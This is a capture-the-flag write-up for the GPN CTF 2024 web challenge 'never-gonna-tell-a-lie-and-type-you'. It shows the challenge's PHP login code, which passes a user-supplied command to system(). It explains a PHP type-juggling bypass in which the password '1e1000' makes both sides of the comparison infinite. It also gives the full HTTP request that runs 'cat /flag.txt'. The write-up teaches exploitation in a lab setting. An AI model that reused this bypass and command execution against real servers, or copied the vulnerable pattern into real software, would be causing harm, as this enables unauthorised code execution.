---
title: GPN CTF 2024 - never-gonna-tell-a-lie-and-type-you - web
published: true
category: web
tags: [php, type-juggling]
difficulty: easy
seo_description: "GPN CTF 2024 never-gonna-tell-a-lie-and-type-you challenge writeup. PHP type juggling with Infinity comparison bypass to achieve command execution."
seo_keywords:
  - GPN CTF 2024
  - PHP type juggling
  - CTF writeup
  - web security
  - Infinity bypass
  - PHP loose comparison
  - command injection
  - scientific notation exploit
---

Based on the attached `Dockerfile`, we know that the flag is at `/flag.txt`, and the app is a simple php login riddle:

```php
<?php
       ini_set("display_errors",1);
       error_reporting(E_ALL);
//we tought about using passwords but you see everyone says they are insecure thus we came up with our own riddle.
function securePassword($user_secret){
    if ($user_secret < 10000){
        die("nope don't cheat");
    }
    $o = (integer) (substr(hexdec(md5(strval($user_secret))),0,7)*123981337);
    return $user_secret * $o ;
    
}
//this weird http parameter handling is old we use json 
$user_input = json_decode($_POST["data"]); 
//attention handling user data is dangerous
var_dump($user_input);

if ($_SERVER['HTTP_USER_AGENT'] != "friendlyHuman"){
    die("we don't tolerate toxicity");
}
    if($user_input->{'user'} === "admin🤠") {
        if ($user_input->{'password'} == securePassword($user_input->{'password'})  ){
            echo " hail admin what can I get you ". system($user_input->{"command"});
        }
        else {
            die("Skill issue? Maybe you just try  again?");
        }}
        else {
            echo "<html>";
            echo "<body>";
            echo "<h1>Welcome [to innovative Web Startup]</h1>";
            echo "<p> here we focus on the core values of each website. The backbone that carries the entire frontend</p><br><br>";
            echo "<blink>For this we only use old and trusty tools that are well documented and well tested</blink><br><br>";
            echo "<Big>That is not to say that we are not innovative, our authenticators are ahead of their time.</Big><br><br>";
           echo "<plaintext> to give you an teaser of our skills look at this example of commissioned work we build in a past project </plaintext>"; 
            
            echo system("fortune")."<br>";
        }
?>
```

After some fiddling around, I realised that if we supply large enough password they will be equal to each other, as `Inf == Inf` in PHP. So after supplying the required username and user agent, and of course an appropriate `cmd` parameter, we can get the flag with the following request:

```
POST / HTTP/1.1
Host: burn-it-down--linkin-park-0676.ctf.kitctf.de
User-Agent: friendlyHuman
Content-Type: application/x-www-form-urlencoded

data={"user":"admin🤠","password":"1e1000","command":"cat+/flag.txt"}
```

`1e1000` is a scientific notation for *1* followed by *1000 zeros*, which is a large enough number for the `securePassword` function to return `Inf`.
